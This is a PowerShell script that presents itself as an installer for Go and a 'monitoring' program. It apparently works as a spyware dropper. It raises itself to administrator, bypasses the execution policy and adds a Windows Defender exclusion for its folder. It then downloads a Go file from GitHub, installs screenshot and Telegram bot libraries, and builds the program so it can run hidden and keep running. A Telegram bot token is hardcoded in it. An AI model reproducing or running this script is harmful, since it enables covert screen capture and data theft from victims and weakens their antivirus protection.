# secfnx_fixed.ps1
# Improved PowerShell installer/runner for Go + monitoring.go
# Usage: powershell.exe -ExecutionPolicy Bypass -NoProfile -File .\secfnx_fixed.ps1

param(
    [string]$BotToken = "8477847766:AAFGIN359PYPPbhe9AwxezwUQqDgXCrPxTE",
    [switch]$Auto,
    [switch]$RunHidden
)

# ------------------ Configuration ------------------
$LogFile      = Join-Path $env:TEMP "download_runner.log"
$MsiName      = "go1.24.7.windows-amd64.msi"    # change if you want a different MSI filename
$MsiUrl       = "https://go.dev/dl/go1.24.7.windows-amd64.msi"  # source for Go MSI
$Url          = "https://github.com/ArthOfficial/TEST/blob/main/monitoring.go"
$GoInstallDir = "C:\Program Files\Go"
$GoBinPath    = Join-Path $GoInstallDir "bin"
$GoFileName   = "monitoring.go"
$DestFolder   = Join-Path $env:USERPROFILE "Downloads\secfnx"
$GoFilePath   = Join-Path $DestFolder $GoFileName
$PathLog      = Join-Path $DestFolder "path_sec.log"
$LogMaxSize   = 10MB

# ------------------ Helpers ------------------
function Log {
    param($Message)
    $Line = "$(Get-Date -Format o) - $Message"
    try {
        if (Test-Path $LogFile) {
            $LogSize = (Get-Item $LogFile).Length
            if ($LogSize -ge $LogMaxSize) {
                $BackupLog = "$LogFile.$(Get-Date -Format 'yyyyMMddHHmmss').bak"
                Rename-Item $LogFile $BackupLog -ErrorAction SilentlyContinue
            }
        }
        Add-Content -Path $LogFile -Value $Line -ErrorAction SilentlyContinue
    } catch {
        # swallow
    }
    Write-Output $Line
}

function Log-Path {
    param($Path, $Type)
    $Line = "$(Get-Date -Format o) - ${Type}: $Path"
    try { Add-Content -Path $PathLog -Value $Line -ErrorAction SilentlyContinue } catch {}
}

function Test-IsAdmin {
    try {
        return ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch { return $false }
}

# Download with a visible progress bar and resume-safe write
function Download-File {
    param(
        [Parameter(Mandatory=$true)] [string]$SourceUrl,
        [Parameter(Mandatory=$true)] [string]$OutPath
    )
    Log "Starting download: $SourceUrl -> $OutPath"
    Log-Path $OutPath "Download-Start"

    try {
        $wc = New-Object System.Net.Http.HttpClient
        $req = New-Object System.Net.Http.HttpRequestMessage([System.Net.Http.HttpMethod]::Get, $SourceUrl)
        $resp = $wc.SendAsync($req,[System.Net.Http.HttpCompletionOption]::ResponseHeadersRead).GetAwaiter().GetResult()
        $resp.EnsureSuccessStatusCode()

        $total = $resp.Content.Headers.ContentLength
        $stream = $resp.Content.ReadAsStreamAsync().GetAwaiter().GetResult()
        $outDir = Split-Path $OutPath -Parent
        if (-not (Test-Path $outDir)) { New-Item -Path $outDir -ItemType Directory -Force | Out-Null; Log-Path $outDir "Folder Created" }

        $buffer = New-Object byte[] 81920
        $fs = [System.IO.File]::Open($OutPath, [System.IO.FileMode]::Create)
        try {
            $read = 0
            $downloaded = 0
            while (($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
                $fs.Write($buffer, 0, $read)
                $downloaded += $read
                if ($total -gt 0) {
                    $percent = [math]::Round(($downloaded / $total * 100),2)
                    Write-Progress -Activity "Downloading $(Split-Path $OutPath -Leaf)" -Status "$percent% ($([math]::Round($downloaded/1KB,2)) KB of $([math]::Round($total/1KB,2)) KB)" -PercentComplete $percent
                } else {
                    Write-Progress -Activity "Downloading $(Split-Path $OutPath -Leaf)" -Status "Downloaded $([math]::Round($downloaded/1KB,2)) KB" -PercentComplete 0
                }
            }
        } finally {
            $fs.Close()
            $stream.Close()
        }
        Write-Progress -Activity "Downloading $(Split-Path $OutPath -Leaf)" -Completed
        Log "Download finished: $OutPath"
        Log-Path $OutPath "File Downloaded"
        return $true
    } catch {
        Write-Progress -Activity "Downloading" -Completed
        Log "Download error for $SourceUrl : $_"
        return $false
    }
}

function Add-ToSystemPath {
    param($Path)
    if (-not (Test-IsAdmin)) { Log "Cannot modify PATH: not admin"; return $false }
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
        if ($CurrentPath -notlike "*${Path}*") {
            Log "Adding $Path to system PATH"
            $NewPath = "$CurrentPath;$Path"
            [Environment]::SetEnvironmentVariable("Path", $NewPath, [System.EnvironmentVariableTarget]::Machine)
            Log "System PATH updated"
            return $true
        }
        Log "$Path already in PATH"
        return $true
    } catch {
        Log "Failed to update PATH: $_"
        return $false
    }
}

function Add-DefenderExclusion {
    param($Path)
    if (-not (Test-IsAdmin)) { Log "Cannot add Defender exclusion: not admin"; return $false }
    try {
        Log "Adding Defender exclusion for $Path"
        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
        Log "Exclusion added"
        return $true
    } catch {
        Log "Failed to add Defender exclusion: $_"
        return $false
    }
}

# Install Go via MSI (shows native MSI UI)
function Install-Go {
    $MsiPath = Join-Path $DestFolder $MsiName
    if (Test-Path (Join-Path $GoInstallDir "bin\go.exe")) {
        Log "Go already installed at $GoInstallDir"
        return $true
    }
    if (-not (Test-IsAdmin)) { Log "Cannot install Go: not admin"; Write-Host "Error: Run as Administrator to install Go."; return $false }

    if (-not (Test-Path $MsiPath)) {
        Log "MSI not present locally. Downloading $MsiUrl"
        if (-not (Download-File $MsiUrl $MsiPath)) { Log "Go MSI download failed"; return $false }
    } else { Log "Found existing MSI at $MsiPath" }

    Log "Launching MSI installer (msiexec) to install Go. MSI path: $MsiPath"
    $Args = "/i `"$MsiPath`""
    try {
        # This will show the standard Windows installer UI and progress
        $proc = Start-Process -FilePath "msiexec.exe" -ArgumentList $Args -Wait -PassThru -ErrorAction Stop
        if ($proc.ExitCode -ne 0) { Log "msiexec returned exit code $($proc.ExitCode)"; return $false }
        Log "Go installed (msiexec exit code 0)"

        # Ensure environment is set
        Add-ToSystemPath $GoBinPath | Out-Null
        [Environment]::SetEnvironmentVariable("GOROOT", $GoInstallDir, [System.EnvironmentVariableTarget]::Machine)
        Log "GOROOT set to $GoInstallDir"

        return $true
    } catch {
        Log "Go MSI install error: $_"
        return $false
    }
}

# Build the Go program into an .exe and run it so it persists after the script exits
function Build-And-Run-Go {
    param($GoFile)
    if (-not (Test-Path $GoFile)) { Log "Go source not found: $GoFile"; return $false }

    Log "Building monitoring.exe from $GoFile"
    $buildOut = Join-Path $DestFolder "monitoring.exe"
    try {
        $Env:PATH = "$Env:PATH;$GoBinPath"
        $proc = Start-Process -FilePath "go" -ArgumentList "build", "-o", "monitoring.exe", (Split-Path $GoFile -Leaf) -WorkingDirectory $DestFolder -NoNewWindow -Wait -PassThru -RedirectStandardError (Join-Path $DestFolder "go_build_error.log") -RedirectStandardOutput (Join-Path $DestFolder "go_build_output.log") -ErrorAction Stop
        if ($proc.ExitCode -ne 0) {
            $err = Get-Content (Join-Path $DestFolder "go_build_error.log") -Raw -ErrorAction SilentlyContinue
            Log "Go build failed with exit code $($proc.ExitCode). Error: $err"
            return $false
        }
        Log-Path $buildOut "File Created"
        Log "Build succeeded: $buildOut"

        # Start the exe as an independent process
        $startInfo = @{ FilePath = $buildOut; WorkingDirectory = $DestFolder; PassThru = $true }
        if ($RunHidden) { $startInfo['WindowStyle'] = 'Hidden' } else { $startInfo['NoNewWindow'] = $false }
        $p = Start-Process @startInfo
        Log "Started monitoring.exe with PID $($p.Id)"
        return $true
    } catch {
        $err = Get-Content (Join-Path $DestFolder "go_build_error.log") -Raw -ErrorAction SilentlyContinue
        Log "Build/Run error: $_. Error: $err"
        return $false
    }
}

# Install Go dependencies (go mod init + go get)
function Install-GoDependencies {
    param($GoFile)
    if (-not (Test-Path $GoFile)) { Log "Go file missing for deps: $GoFile"; return $false }
    Log "Installing Go module + dependencies in $DestFolder"
    try {
        $Env:PATH = "$Env:PATH;$GoBinPath"
        $gomod = Join-Path $DestFolder "go.mod"
        if (Test-Path $gomod) { Remove-Item $gomod -Force -ErrorAction SilentlyContinue; Log-Path $gomod "File Deleted" }
        $goSum = Join-Path $DestFolder "go.sum"
        if (Test-Path $goSum) { Remove-Item $goSum -Force -ErrorAction SilentlyContinue; Log-Path $goSum "File Deleted" }

        $proc = Start-Process -FilePath "go" -ArgumentList "mod", "init", "monitoring" -WorkingDirectory $DestFolder -NoNewWindow -Wait -PassThru -RedirectStandardError (Join-Path $DestFolder "go_mod_error.log") -RedirectStandardOutput (Join-Path $DestFolder "go_mod_output.log") -ErrorAction Stop
        if ($proc.ExitCode -ne 0) { $err = Get-Content (Join-Path $DestFolder "go_mod_error.log") -Raw -ErrorAction SilentlyContinue; Log "go mod init failed: $err"; return $false }
        Log-Path $gomod "File Created"

        # Fetch typical deps used by the project (adjust as necessary)
        $proc = Start-Process -FilePath "go" -ArgumentList "get", "-v", "github.com/kbinani/screenshot", "github.com/go-telegram-bot-api/telegram-bot-api/v5" -WorkingDirectory $DestFolder -NoNewWindow -Wait -PassThru -RedirectStandardError (Join-Path $DestFolder "go_get_error.log") -RedirectStandardOutput (Join-Path $DestFolder "go_get_output.log") -ErrorAction Stop
        if ($proc.ExitCode -ne 0) { $err = Get-Content (Join-Path $DestFolder "go_get_error.log") -Raw -ErrorAction SilentlyContinue; Log "go get failed: $err"; return $false }
        Log-Path (Join-Path $DestFolder "go.sum") "File Created"
        Log "Dependencies installed"
        return $true
    } catch {
        Log "Dependency install error: $_"
        return $false
    }
}

# ------------------ Main ------------------
Log "Script started. Source URL: $Url"

if (-not (Test-IsAdmin)) {
    Log "Not running as admin. Relaunching as admin."
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Ensure destination folder
if (-not (Test-Path $DestFolder)) { New-Item -Path $DestFolder -ItemType Directory -Force | Out-Null; Log-Path $DestFolder "Folder Created" }

# Ensure path log exists and is hidden
if (-not (Test-Path $PathLog)) { New-Item -Path $PathLog -ItemType File -Force | Out-Null; Log-Path $PathLog "File Created"; (Get-Item $PathLog).Attributes = 'Hidden' }

# Convert GitHub blob -> raw if needed
if ($Url -match "github.com/.+/blob/.+") {
    $raw = $Url -replace "https://github.com/", "https://raw.githubusercontent.com/" -replace "/blob/", "/"
    Log "Converted blob URL to raw: $raw"
    $Url = $raw
}

# Download monitoring.go
if (Test-Path $GoFilePath) { Log "Removing existing $GoFilePath"; Remove-Item $GoFilePath -Force -ErrorAction SilentlyContinue; Log-Path $GoFilePath "File Deleted" }
Log "Downloading Go script from $Url to $GoFilePath"
if (-not (Download-File -SourceUrl $Url -OutPath $GoFilePath)) { Log "Failed to download Go script. Exiting."; exit 1 }

# Install Go (downloads MSI if required and runs msiexec - shows native installer progress)
if (-not (Install-Go)) { Log "Go installation failed. Exiting."; exit 1 }

# Set ExecutionPolicy for process
Set-ExecutionPolicy Bypass -Scope Process -Force
Log "Set security bypass"

# Add Defender exclusion (best-effort)
Add-DefenderExclusion $DestFolder | Out-Null

# Install Go dependencies
if (-not (Install-GoDependencies $GoFilePath)) { Log "Failed to install dependencies. Exiting."; exit 1 }

# Build and run the Go program so it persists after this script exits
if (-not (Build-And-Run-Go $GoFilePath)) { Log "Failed to build/run monitoring program. Exiting."; exit 1 }

Log "Script completed successfully. Monitoring process started. Check $PathLog and $LogFile for detailed steps."
